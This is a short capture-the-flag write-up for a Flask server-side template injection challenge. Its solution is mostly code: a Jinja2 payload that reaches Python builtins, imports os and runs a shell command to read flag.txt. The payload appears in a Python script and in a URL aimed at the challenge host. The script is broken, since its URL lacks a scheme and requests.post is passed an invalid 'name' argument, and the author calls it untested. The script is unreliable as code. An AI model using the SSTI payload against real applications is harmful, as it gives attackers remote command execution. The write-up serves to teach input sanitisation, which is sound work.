# Why Hello There - SSTI Vulnerability
**Description**: I have created a simple site to host my most favorite stuff. There is an issue with one of the parameters and I'm not sure what to do! Can you get the flag using this parameter?
- *Hints*: Always be sure to sanitize user input!... Even ones that are not always visually obvious at first glance.

The goal of this challenge is to introduce possible Flask SSTI vulnerabilities that can happen from non-sanitized/escaped user input. This can lead to Remote Code Execution as seen in the solution below.

## Solution
```python
import requests

url = 'localhost:5000/'

payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}"

resp = requests.post(url, name=payload)
print(resp.text)
```

note: The code above is not tested, but the payload is something along those lines.

I.e.,
```
https://grizzctf.co:9000/?name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
```

